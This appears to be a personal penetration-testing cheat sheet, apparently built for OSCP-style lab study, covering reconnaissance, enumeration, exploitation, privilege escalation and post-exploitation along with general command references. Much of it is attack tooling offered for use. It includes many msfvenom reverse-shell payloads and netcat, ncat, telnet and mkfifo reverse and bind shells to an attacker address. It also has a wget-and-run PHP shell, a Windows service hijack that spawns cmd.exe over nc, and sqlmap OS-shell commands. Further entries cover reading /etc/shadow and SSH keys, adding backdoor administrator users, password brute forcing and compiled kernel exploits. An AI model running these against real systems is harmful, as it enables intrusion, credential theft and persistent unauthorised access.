# Phase 1 - Reconnaissance
* Collect public information about the victim
* Company Website
* Social Media (Linkedin, FB, Twitter, etc. for company and/or people)

|Command|Result|
|---|---
|`dmitry victim`|A lot!!
|`theharvester -d victim -b all`|Juicy info from various sources
|`whois --verbose victim`|Public domain info
|`https://archive.org`|Previous looks of a the website
|`curl`|TBD
|`host victim`|TBD
|`intitle` `allintitle`<td rowspan=7>Various Google Hacks
|`inurl` `allinurl`
|`filetype`
|`ext`
|`intext` `allintext`
|`site`
|`https://www.exploit-db.com/google-hacking-database`
|`http://www.serversniff.net`<td rowspan=3>Various networking tools
|`http://geektools.com`
|`http://network-tools.com`

# Phase 2 - Remote Enumeration and Pre-Exploitation
* Enumerate each services
* Identify possible vulnerabilities of each services
* Verify each vulnerabilities
* Prioritize vulnerabilities

|Command|Result
|---|---
|`nbtscan`<td rowspan=2>netbios name
|`for i in {0..255};do nbtscan x.x.x.$i;done`
|`nmap -sn x.x.x.x/24`<td rowspan=2>Lists machines that respond to ping
|`nmap -sP x.x.x.*`
|`nmap -A -T4 -F --open victim`|Scans top 100 TCP ports
|`nmap -A -sU -T4 -F --open victim`|Scans top 100 UDP ports
|`nmap -A -p- -T4 --reason victim`|Scans all TCP ports
|`nmap -T4 -sU --reason victim`|Scans all UDP ports
|`nc`|TBD
|`ncat`|TBD
|`unicornscan`|TBD
|`wireshark`|TBD
|`traceroute`|TBD
|`maltego`|TBD
|`arping`|Layer 2 TBD
|`netdiscovery`|Layer 2 TBD
|`fping`|Layer 3 TBD
|`hping3`|Layer 3 TBD
|`p0f`|TBD
|`net`|TBD
|`nmblookup`|TBD
|`zaproxy`|TBD
|`cewl`|TBD
|`john`|TBD
|`medusa`|TBD
|`Hashcat`|TBD
|`pth`|TBD
|`pwdump`|TBD
|`fgdump`|TBD
|**Database**||
|`sqlmap -u victim --crawl=1`|TBD
|`sqlmap -u victim?id=xyz --dbms=mysql --dump --threads=5`|TBD
|`sqlmap -u victim?id=yxz --dbms=mysql --os-shell`|TBD
|`sqlmap -u victim?id=yxz --dbms=mysql --cookie='Cookie=security=low;PHPSESSID=cdj6diekrmhugjrql4ktjavi40' --os-shell`|

|Port|Service|Command|Result
|---|---|---|---
|21|FTP|``|TBD
|22|SSH|``|TBD
|23|Telnet|``|TBD
|53<td rowspan=3>DNS|`dnsenum`<td rowspan=3>DNS stuff
|53|`dnsrecon -d victim.com -a`
|53|`host victim`
|67/8|DHCP|``|TBD
|69|FTP|``|TBD
|80/443<td rowspan=5>http/s|`GoBuster`<td rowspan=4>Fuzzing directories
|80/443|`dirb victim`
|80/443|`nikto -h victim`
|80/443|`dirbuster`
|80/443|`Burp`|TBD
|110|POP3|``|TBD
|135/7/8/9<td rowspan=5>RPC/SMB/NetBIOS|`enum4linux -a victim`<td rowspan=3>Enumerate
|135/7/8/9/445|`nbtscan -r victim`
|135/7/8/9/445|`nmap -p 135,137,138,139,445 --script "smb*"`
|135/7/8/9/445|`smbclient`<td rowspan=2>TBD
|135/7/8/9/445|`rpcclient -U "" victim`
|161/2<td rowspan=7>SNMP|`echo public > community; echo private >> community; echo manager >> community; for ip in $(seq 200 254); do echo 10.11.1.${ip}; done > ips; onesixtyone -c community -i ips`| Fuzzing community strings
|161/2|`snmpenum victim community`<td rowspan=2>TBD
|161/2|`snmp-check`
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.4.1.77.1.2.25`|windows users
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.25.4.2.1.2`|current Windows processes
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.6.13.1.3`|Windows’ open TCP ports
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.25.6.3.1.2`|installed software

# Phase 3 - Remote Exploitation

|Command|Result
|---|---
|**Reverse Shells**||
|`msfvenom`|TBD
|**Compiling**||
|`edb`|TBD
|`gcc`|TBD
|`mingw`|TBD
|`wine`|TBD
|`mingw-w64`|TBD
|`i686-w64-mingw32-gcc`|TBD
|`edb`|TBD
|``|TBD
|**Buffer Overflow**||

## Buffer Overflow

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 (buffer overflow)  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046 (buffer overflow)  
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb (buffer overflow)

sudo apt-get install mingw-w64 | i686-w64-mingw32-gcc -o main32.exe main.c | x86_64-w64-mingw32-gcc -o main64.exe main.c (buffer overflow)  
i686-w64-mingw32-gcc (buffer overflow)

# Phase 4 - Local Enumeration and Pre-Exploitation
* Enumerate services and others
* Identify possible vulnerabilities of each services


# Phase 5 - Local Exploitation
|Command|Result
|---|---
|**Linux**||
|**Kernel, OS & Device Information**||
|`uname -a`|Print all available system information
|`uname -r`|Kernel release
|`uname -n`|System hostname
|`hostname`|As above
|`uname -m`|Linux kernel architecture (32 or 64 bit)
|`cat /proc/version`|Kernel information
|`cat /etc/*-release`|Distribution information
|`cat /etc/issue`|As above
|`cat /proc/cpuinfo`|CPU information
|`df -a`|File system information
|**Users & Groups**||
|`cat /etc/passwd`|List all users on the system
|`cat /etc/group`|List all groups on the system
|`for i in $(cat /etc/passwd 2>/dev/null PIPE cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null`|List all uid’s and respective group memberships
|`cat /etc/shadow`|Show user hashes
|`grep -v -E "^#" /etc/passwd PIPE awk -F: '$3 == 0 { print $1}'`|List all super user accounts
|`finger`|Users currently logged in
|`pinky`|As above
|`users`|As above
|`who -a`|As above
|`w`|Who is currently logged in and what they’re doing
|`last`|Listing of last logged on users
|`lastlog`|Information on when all users last logged in
|`lastlog –u %username%`|Information on when the specified user last logged in
|`lastlog PIPE grep -v "Never"`|Entire list of previously logged on users
|**User & Privilege Information**||
|`whoami`|Current username
|`id`|Current user information
|`cat /etc/sudoers`|Who’s allowed to do what as root
|`sudo -l`|Can the current user perform anything as root
|**Environmental Information**||
|`env`|Display environmental variables
|`set`|As above
|`echo $PATH`|Path information
|`history`|Displays command history of current user
|`pwd`|Print working directory, i.e. ‘where am I’
|`cat /etc/profile`|Display default system variables
|`cat /etc/shells`|Display available shells
|**Interesting Files**||
|`find / -perm -4000 -type f 2>/dev/null`|Find SUID files
|`find / -uid 0 -perm -4000 -type f 2>/dev/null`|Find SUID files owned by root
|`find / -perm -2000 -type f 2>/dev/null`|Find GUID files
|`find / -perm -2 -type f 2>/dev/null`|Find world-writeable files
|`find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null`|Find world-writeable files excluding those in /proc
|`find / -perm -2 -type d 2>/dev/null`|Find word-writeable directories
|`find /home –name *.rhosts -print 2>/dev/null`|Find rhost config files
|`find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;`|Find *.plan files, list permissions and cat the file contents
|`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;`|Find hosts.equiv, list permissions and cat the file contents
|`ls -ahlR /root/`|See if you can access other user directories to find interesting files
|`cat ~/.bash_history`|Show the current users’ command history
|`ls -la ~/.*_history`|Show the current users’ various history files
|`ls -la /root/.*_history`|Can we read root’s history files
|`ls -la ~/.ssh/`|Check for interesting ssh files in the current users’ directory
|`find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null PIPE xargs -r ls -la`|Find SSH keys/host information
|`ls -la /usr/sbin/in.*	`|Check Configuration of inetd services
|`grep -l -i pass /var/log/*.log 2>/dev/null`|Check log files for keywords (‘pass’ in this example) and show positive matches
|`find /var/log -type f -exec ls -la {} ; 2>/dev/null`|List files in specified directory (/var/log)
|`find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null`|List .log files in specified directory (/var/log)
|`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null`|List .conf files in /etc (recursive 1 level)
|`ls -la /etc/*.conf`|As above
|`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null`|Find .conf files (recursive 4 levels) and output line number where the word ‘password’ is located
|`lsof -i -n`|List open files (output will depend on account privileges)
|`head /var/mail/root`|Can we read roots mail
|**Service Information**||
|`service --status-all` use systemctl for centos/rhel7+|list running services
|`service httpd status`|Print the status of any service
|`netstat -tulpn`|List service and their open ports
|``|
|``|
|``|
|`ps aux PIPE grep root`|View services running as root
|`ps aux PIPE awk '{print $11}' PIPE xargs -r ls -la 2>/dev/null PIPE awk '!x[$0]++'`|Lookup process binary path and permissions
|`cat /etc/inetd.conf`|List services managed by inetd
|`cat /etc/xinetd.conf`|As above for xinetd
|`cat /etc/xinetd.conf 2>/dev/null PIPE awk '{print $7}' PIPE xargs -r ls -la 2>/dev/null`|A very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of each
|`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`|Permissions and contents of /etc/exports (NFS)
|**Jobs/Tasks**||
|`crontab -l -u %username%`|Display scheduled jobs for the specified user
|`ls -la /etc/cron*`|Scheduled jobs overview (hourly, daily, monthly etc)
|`ls -aRl /etc/cron* PIPE awk '$1 ~ /w.$/' 2>/dev/null`|What can ‘others’ write in /etc/cron* directories
|`top`|List of current tasks
|**Networking, Routing & Communications**||
|`/sbin/ifconfig -a`|List all network interfaces
|`cat /etc/network/interfaces`|As above
|`arp -a`|Display ARP communications
|`route`|Display route information
|`cat /etc/resolv.conf`|Show configured DNS sever addresses
|`netstat -antp`|List all TCP sockets and related PIDs
|`netstat -anup`|List all UDP sockets and related PIDs
|`iptables -L`|List rules
|`cat /etc/services`|View port numbers/services mappings
|**Programs Installed**||
|`dpkg -l`|Installed packages (Debian)
|`rpm -qa`|Installed packages (Red Hat)
|`sudo -V`|Sudo version – does an exploit exist?
|`httpd -v`|Apache version
|`apache2 -v`|As above
|`apache2ctl (or apachectl) -M`|List loaded Apache modules
|`mysql --version`|Installed MYSQL version details
|`psql -V`|Installed Postgres version details
|`perl -v`|Installed Perl version details
|`java -version`|Installed Java version details
|`python --version`|Installed Python version details
|`ruby -v`|Installed Ruby version details
|`find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc)`|Locate ‘useful’ programs (netcat, wget etc)
|`which %program_name% (i.e. nc, netcat, wget, nmap etc)`|As above
|`dpkg --list 2>/dev/null PIPE grep compiler PIPE grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null PIPE grep gcc 2>/dev/null`|List available compilers
|`cat /etc/apache2/envvars 2>/dev/null PIPE grep -i 'user PIPE group' PIPE awk '{sub(/.*export /,"")}1'`|Which account is Apache running as
|**Common Shell Escape Sequences**||
|`:!bash`|vi, vim
|`:set shell=/bin/bash:shell`|vi, vim
|`!bash`|man, more, less
|`find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; `|find
|`awk 'BEGIN {system("/bin/bash")}'`|awk
|`--interactive`|nmap
|`echo "os.execute('/bin/sh')" > exploit.nse`|nmap
|`sudo nmap --script=exploit.nse`|nmap
|`perl -e 'exec "/bin/bash";'`|Perl

# Phase 6 - Post-Exploitation
tftp (file transfer)  
pure-ftpd (file transfer)  
cscript wget.vbs httpaddress file.exe (file transfer)  
powersploit (file transfer)  
meshang (file transfer)?  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 (file transfer) (win)  
pyinstaller (privilege escalation) (win)  
pywin32-218.win32-py2.7.exe (privilege escalation) (win)  
icacls <filename> (privilege escalation) (win)  
Get-WmiObject (privilege escalation) (win)  
AccessChk (privilege escalation) (win)  


# Stuff I've used
## Working Exploits
* Just because it says 1.1 doesn't mean it doesn't work on 1.0

|Type|Notes|Product|URL
|---|---|---|---
|Remote||Wordpress wp-forum SQL Injection|https://cxsecurity.com/issue/WLB-2013020035
|Remote||Cuppa CMS 'alertConfigField.php' Remote / Local File Inclusion|https://www.exploit-db.com/exploits/25971/
|Remote||PHPLiteAdmin 1.9.3 Remote PHP Code Injection|https://www.exploit-db.com/exploits/24044/
|Remote||Samba 2.2.8 - Remote Code Execution|https://www.exploit-db.com/exploits/10/
|Local/Escalation|`gcc exploit.c -o exploit`|FreeBSD 9.0Intel SYSRET Kernel Privilege Escalation|https://www.exploit-db.com/exploits/28718/
|Local/Escalation|`gcc -o exploit exploit.c`|Linux Kernel 2.4.x/2.6.x 'sock_sendpage()' Privilege Escalation|https://www.exploit-db.com/exploits/9545/
|Local/Escalation|`i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe`|Microsoft Windows (x86) 'afd.sys' Privilege Escalation (MS11-046)|https://www.exploit-db.com/exploits/40564/
|Local/Escalation||Microsoft Windows XP/2000 - 'Mrxsmb.sys' Privilege Escalation (PoC) (MS06-030)|https://www.exploit-db.com/exploits/1911/
|Local/Escalation|#include <string.h>`gcc exploit.c -o exploit`|Microsoft Windows 'RPC DCOM' Remote Exploit (Universal)|https://www.exploit-db.com/exploits/76/
|Local/Escalation|`gcc -pthread exploit.c -o exploit -lcrypt`|Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)|https://www.exploit-db.com/exploits/40839/
|Local/Escalation|`g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exploit exploit.cpp -lutil`|Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' '/proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)|https://www.exploit-db.com/exploits/40847/
|Local/Escalation|`gcc -o exploit exploit.c`|Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Integer Overflow Privilege Escalation|https://www.exploit-db.com/exploits/1397/
|Local/Escalation|`#include <stdio.h>, <string.h>, <stdlib.h>` stat -> strcat `gcc -o exploit exploit.c -Wl,--hash-style=both`|Linux Kernel < 2.6.22 - 'ftruncate()/open()' Privilege Escalation|https://www.exploit-db.com/exploits/6851/
|Local/Escalation|`gcc -o exploit exploit.c -Wl,--hash-style=both`|Linux Kernel 2.6.x - 'pipe.c' Privilege Escalation (2)|https://www.exploit-db.com/download/33322
|Local/Escalation|``||

## Compiling
To compile 32 bit applications on 64 bit Linux:
apt-get install libc6-dev-i386
gcc -Wall -m32 -o exploit exploit.c
Complining 64 bit applications on Linux:

gcc -Wall -m64 -o exploit exploit.c
To compile static applications use the “-static” parameter additionally!
Cross-Compiling Windows applications on Linux:
apt-get install mingw32
i586-mingw32msvc-gcc exploit.c -o exploit -lws2_32
Generate EXE from python file in Windows:
python pyinstaller.py --onefile script

## Reverse Shells
|Command
|---
|**Linux**
|`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f elf > shell.elf`
|`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f elf > shell.elf`
|`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f war  > shell.war`
|`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f jsp > shell.jsp`
|`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f raw > shell.sh`
|`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f elf > shell.elf`
|`msfvenom -p linux/x86/shell_bind_tcp LPORT=443 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai`
|**Solaris**
|`msfvenom -p solaris/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f war  > shell.war`
|**Windows**
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f exe > shell.exe`
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f exe > shell.exe`
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=444 -a x86 --platform windows -e x86/shikata_ga_nai -f exe > shell.exe`
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 EXITFUNC=thread -f exe-service > shell-service.exe`
|**Mac**
|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f macho > shell.macho`
|**PHP**
|`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f raw > /tmp/shell.php && sed -i 's/#<?php/<?php/' /tmp/shell.php`
|`msfvenom -p php/reverse_php LHOST=10.11.0.145 LPORT=443 -f raw > shell.php`
|**ASP**
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f asp > shell.asp`
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.145 LPORT=443 -f asp > shell.asp`
|**JSP**
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f raw > shell.jsp`
|**WAR**
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.145 LPORT=443 -f war > shell.war`


## Linux Commands
|Command|Result
|---|---
|**CAT**||
|`cat file1`<td rowspan=2>display contents of file
|`cat < file1`|
|`cat file1 file2`<td rowspan=2>display content of multiple files
|`cat file1; cat file2`|
|`cat > file1`|create file (ctrl+d to exit text mode)
|`cat file1 > file2`|copy output into new or overwrite a file
|`cat file1 >> file2`|the file1 will append at the end of file2
|`cat file1 PIPE more`<td rowspan=2>use more to view small files, less to view big files
|`cat file1 PIPE less`
|`cat -n file1`|display line numbers
|`cat file1 file2 file3 PIPE sort > file4`|sort contents of multiple files into a single file
|`cat --show-nonprinting file1`|show hidden characters
|**LS**||
|`ls -d [a]*`|list all content in current directory that start with a
|`ls -al`|view hidden files
|`ls -l`|extra information of the file
|`ls -r`|the files in reverse
|`ls -t`|sort files from latest to oldest touched
|`ls -d [directory]`|show property of the directory
|`ls -i`|show inode
|`ls -lhaR`|TBD
|**CP**||
|`cp -R directory destination`|copy everything inside the directory
|`cp file ~/directory/`|copy to the directory
|**MKDIR**||
|`mkdir -p directory/path`|create complete path of directory
|`rmdir directory/path`|remove directory
|`rmd -rf directory/path`|remove directory with content inside them
|**GREP**||
|`grep -C 3 'millionth' data.txt`|display pattern and 3 nearbies
|**FIND**||
|`find . ! -executable`|file that isn't executable
|`find . -size 1033c`|file that is 1033 bytes in size
|`find . -type f`|regular file
|`find . -type f -size 1033c ! -executable -exec file {} \;`|execute a find command
|`find . -type f -size 1033c ! -executable -exec file {} + PIPE grep ASCII`|execute a find command and pipe it to a grep
|`find . -type f -print0 PIPE xargs -0 dos2unix`|remove carriage from scripts moved to linux from windows
|`find . -user bandit7 -group bandit6 2>&1 PIPE grep -v "Permission denied" PIPE grep -v "No such file or directory" PIPE grep -v "/proc*"`|look for things you own
|**SORT**||
|`sort file1 PIPE uniq -u`|find/sort unique values
|**TOUCH**||
|`touch file1`|create a file with no content
|**LN**|
|`ln file1 file2`|create hard links
|`ln -s file1 file2`|create soft links
|**ADDUSER**||
|`useradd student -g root, sudo -d /dev/null -s /bin/bash`|TBD
|`visudo` `newuser    ALL=(ALL:ALL) ALL`<td rowspan=2>give admin rights
|`sudo passwd student`|
|``|


## Windows Commands
|Command|Result
|---|---
|`tftp`|TBD
|`pure-ftpd`|TBD
|`powersploit`|TBD
|`meshang`|TBD
|`pyinstaller`|TBD
|`icacls`|TBD
|`Get-WmiObject`|TBD
|`AccessChk`|TBD

windows
## INFORMATION GATHERING
systeminfo
ipconfig /all
set
netstat -ano
netsh firewall show state
netsh firewall show config
schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY
sc qc Spooler
cacls

reg query HKLM\SYSTEM\CurrentControlSet\Services\Spooler


## ESCALATION
https://github.com/AlessandroZ/BeRoot/releases

sc query state= inactive |find /I "SERVICE_NAME"
sc query state= all |find /I "SERVICE_NAME"
https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx
sc sdshow upnphost
https://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc.exe config "[servicename]" obj= "[.\username]" password= "[password]"
sc config SSDPSRV start= demand
sc sc Spooler binpath= "C:\Inetpub\wwwroot\no\nc.exe -nv 10.11.0.145 444 -e C:\WINDOWS\System32\cmd.exe"
sc qc SSDPSRV
net start SSDPSRV

cacls "C:\Program Files\*"


https://msdn.microsoft.com/en-us/library/aa374928(v=vs.85).aspx
https://deploywindows.info/2013/10/17/how-to-build-a-sddl-string-and-set-service-permissions/
https://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
(A;;CCLCSWLOCRRC;;;AU)
(ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute))

# NET
list all groups
net localgroup

hosts in current domain
net view /domain

add user
net user student offsec /add
net user account password /add

add user to localgroup
net localgroup Administrators student /add
net localgroup "Remote Desktop Users" student /add

# DIR
list of sub-folders and their files, ordered by folder-names
dir /b /s | sort

shows you owners directories
dir /Q

# POWERSHELL
Get-WmiObject win32_service | Format-Table name, startname, startmode

## WIRESHARK
ip.addr == 10.0.0.1
ip.src == 10.0.0.1
tcp or dns
tcp.port == 443
tcp.analysis.flags
!(arp or icmp or dns)
follow tcp stream
tcp contains facebook
http.response.code == 200
http.request
tcp.flags.syn == 1

# WGET
reverse shell
cd /tmp && wget -O shell.php http://10.11.0.145/shell.php && php -f shell.php 2>&1
wget -O exploit.c https://www.exploit-db.com/download/1397


# TELNET
connect
telnet -l user address port

reverse shell
telnet 10.11.0.145 80 | cmd.exe | telnet 10.11.0.145 443
telnet 10.11.0.145 80 | /bin/bash | telnet 10.11.0.145 443
mknod backpipe p && telnet 10.11.0.145 443 0<backpipe | /bin/bash 1>backpipe

# NC
listening on port 443/TCP
nc -nlvp 443
nc -nv ipaddress 443

listener saves received data into a file
nc -nlvp 443 > file1

send data to port
nc -nv ipaddress 443 < file1

listener sends/prints  the file when someone connects
nc -nlvp 443 < file1

listener echos  the file when someone connects
echo hello | nc -nlvp 443

bind shell (the person listening gives their cmd)
nc -nlvp 443 -e cmd.exe
nc -nlvp 443 -e /bin/bash
nc -vn 10.11.10.156 443

reverse shell (the person connecting gives their control)
nc -vn 10.11.0.145 443 -e cmd.exe
nc -vn 10.11.0.145 443 -e /bin/bash
nc -nlvp 443
https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem
/bin/sh -c "/bin/sh 0</tmp/backpipe | nc 10.11.0.145 443 1>/tmp/backpipe"

without -e option (default)
Listening

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp <port> > /tmp/f
Reverse

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.11.0.145 443 > /tmp/f

# NCAT
bind shell (the person listening gives their cmd)
ncat -lvp 443 -e cmd.exe --ssl --allow 10.11.0.145
ncat -lvp 443 -e /bin/bash --ssl --allow 10.11.0.145
ncat -v 10.11.10.156 443 --ssl

reverse shell (the person connecting gives their control)
ncat -v 10.11.0.145 443 -e cmd.exe --ssl
ncat -v 10.11.0.145 443 -e /bin/bash --ssl
ncat -lvp 443 --ssl --allow 10.11.10.156

# TFTP
start tftp services
atftpd --daemon --port 69 /directory/path

downloading file from linux to windows
tftp -i ipaddress GET filename

upload file from windows to linux
tftp -i ipaddress PUT filename

# FTP
start ftp services
ftp domain.com
ftp ipaddress
ftp user@domain.com or ftp ipaddress

anynomous login
user name is anynomous
password is 1@gmail.com

# CHMOD
Access Class: u (user) g (group) o (other) a (all: u, g and o)\
Operator: + (add access) - (remove access) = (set exact access)
Access Type: r (read) w (write) x (execute)

executing a file as someone else
./file -u bandit20

change file permission of all files in current folder
chmod -R 764 .

set suid to a file
chmod u+s file1

to find all suid files in linux
find . -perm -4000 2>&1 | grep -v "Permission denied"
find . -perm +4000


# OPENSSL
to find/sort unique values
openssl s_client -ign_eof -connect bandit.labs.overthewire.org:30001

# FILE
the cmd will tell you the file content
file file1

the file types in directory. ascii
file folder/*


# SED
this will replace any occurrence of the characters 'cat' by 'dog'
sed -i 's/cat/dog/' file.txt

substitute (find and replace) "foo" with "bar" on each line
sed 's/foo/bar/'             # replaces only 1st instance in a line
sed 's/foo/bar/4'            # replaces only 4th instance in a line
sed 's/foo/bar/g'            # replaces ALL instances in a line
sed 's/\(.*\)foo\(.*foo\)/\1bar\2/' # replace the next-to-last case
sed 's/\(.*\)foo/\1bar/'            # replace only the last case

# AWK
basic usage
awk '/search pattern/ {actions}' file
awk -F :'{ print $4 }' file
awk -F : '/user/ { print $4 }' file
awk -F : '{ print $1,$NF}' file
awk -F : '$3 > 500' file
awk -F : '$NF ~bash/' file

# HOST
dns, dns server
host -t ns megacorpone.com

dns, mail server
host -t mx megacorpone.com

get ip address
host www.megacorpone.com

# PASSWORD ATTACK
# Medusa

medusa -h 10.11.1.31 -u sa -P /usr/share/wordlists/rockyou.txt -O medusaOutput.txt -M mssql

# SSH
https://netsec.ws/?cat=26

|Command|Result|
|---|---
|**Tunneling**||
|`ssh gateway -L local_port_to_listen:remote_host:remote_port`<td rowspan=2>Local Port Forwarding
|`ssh user@gateway -L 8888<remote host>:80`
|`ssh gateway -R remote_port_to_bind:local_host:local_port`|Remote Port Forwarding
|`ssh -D local_proxy_port -p remote_port victim`<td rowspan=2>Dynamic Port Forwarding
|`ssh -f -N -D 9050 user@gateway`
|`proxychains ssh -f -N -D 10050 user@gateway2`|edit proxychains.conf with new 10050
|``|TBD

# I used the links below and links within the links to build my own crappy list

http://www.fuzzysecurity.com/tutorials/16.html
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
https://blog.propriacausa.de/wp-content/uploads/2016/07/oscp_notes.html
https://www.rebootuser.com/?p=1623
https://github.com/1N3/PrivEsc

# CEWL
cewl victim -m 6
options
-w wordlist.txt
-m 6 (minimum word)
-n (dont output wordlist)

# GDB
gdb
info function
list

# ARPING
layer 2 scans
arping ipadresses <-- does not stop
arping ipaddresses -c 2 <--- does it 2 times
eth.type == 0x0806 (only arp packets)

# FPING
fping
fping -a -c 2 ipaddress
fping -a -c 1 -g ipaddresses
fping -f /root/iplist.txt

# HPING3
hping3
hping3 -1 ipaddress
hping3 -1 ipaddress -c 1 <--- one time
ping ipaddress -c 1
ping ipaddress -c 1 | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1

#!/bin/bash
for address in $(seq 1 254); do
ping ipaddress -c 1 | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done

# NMAP
gives me ip addresses
nmap -sn 192.168.108.0/24

finger prints top 1k ports and OS of one machine
nmap -A 192.168.108.131

finger prints top 1k ports and OS of one machine
nmap -A -p- 192.168.108.131

host discovery + TCP top 1000 port scan on each discovered host
nmap -sS 0.0.0.0/24

host discovery + UDP top 1000 port scan on each discovered host
nmap -sU 0.0.0.0/24

top 100 fast scans
nmap -T4 -F 0.0.0.0

Intense scans
nmap -p- -sS -sU -T4 -A -v ipaddress
nmap -p- -A -v ipaddress
scan a list of host from a file
nmap -iL file1

list victims to scan
nmap -sL ipaddress/24 or ipaddress/*

ping scan - no port scan
nmap -sn ipaddress/24 or ipaddress/*
nmap -sP ipaddress/24 or ipaddress/*

scan all port tcp
nmap -p- ipaddress

scan all ports udp
nmap -sU -p- ipaddress

enumerate directories used by popular web applications:
nmap --script http-enum ipaddress
nmap --script "http-vuln*"

--scripts
--script-args uri=/path/to/something
--script-args uri=/cgi-bin/admin.cgi

nmap -PR -sn ipaddresses
-sn disables port scans

intense scan
nmap -T4 -A -v ipaddress

# Miscellaneous
tcpdump pcap
tcpdump -r file.pcap

view services that are running
netstat -antp

another type of trace
bash -x file

tcp port scans and read banner (enumurate)
dmitry -pb ipaddress

verify banner against list of signatures
amap -bqv ipaddress port

to find what shell is the user using
getent passwd $LOGNAME | cut -d: -f7
or
getent passwd bandit26 | cut -d: -f7

display an image
display file1

tracer, tells you everything the program is doing
ltrace ./file1

get ip address
ifconfig

compare two files
cmp file1 file2

to find human readable text that start with =
strings file1 | grep "="

decode a file
base64 -d file1

rotate text ** need to learn more ROT13 TR
cat file1 | tr a-zA-Z n-za-mN-ZA-M

hexdump reverse
xxd file1 | xxd -r > file2
xxd -r file1 > file2

edit text in terminal. ZZ to save & :q! w/o
vi file1

it will list your ids (uid, gid and groups)
id

it will list ids of the file
id file1 id

inputs, outputs and error stdin, stdout, stderr
> file redirects stdout to file
1> file redirects stdout to file
2> file redirects stderr to file
&> file redirects stdout and stderr to file
/dev/null
2>&1

change permission rights all files
chmod -R 764 .

DF/DU
df - check linux system disk space
du -h [optional dir] - size of things in current folder
du -sh [optional dir] - combined size of all files in directory
du -a [optional dir] - disk usage of all files and directories

sudo - log as a user for extra power, multiple password
su - root power, one time password

ps -ef or ps-aux

Layer 4 / Application =telnet, ftp, smtp, dns, rip, smnp
Layer 3 / Transport = tcp, udp
Layer 2 / network layer = IP (arp, igmp, icmp)
Layer 1 / physical = ethernet, token, frame relay, atm

route -n

sudo grep -R "DHCPOFFER" /var/log/*
